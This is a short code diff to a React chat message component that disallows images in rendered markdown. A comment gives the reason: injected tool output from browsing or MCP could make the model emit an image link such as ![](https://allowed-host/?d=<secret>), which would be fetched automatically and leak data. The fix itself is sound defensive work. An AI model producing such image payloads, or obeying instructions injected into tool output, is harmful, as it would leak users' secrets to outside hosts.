@@ -133,6 +133,10 @@ function MessageBubble({ message }: { message: ChatMessage }) {
         ) : (
           <div className="prose prose-sm max-w-none prose-a:text-blue-600 prose-a:underline prose-p:my-1 prose-ul:my-1 prose-li:my-0">
             <ReactMarkdown
+              // No images: tool output (browse/MCP) feeds the LLM, so an injected
+              // ![](https://allowed-host/?d=<secret>) would auto-fetch and leak data.
+              disallowedElements={["img"]}
+              unwrapDisallowed
               components={{
                 a: ({ href, children }) => (
                   <a href={href} target="_blank" rel="noopener noreferrer">{children}</a>
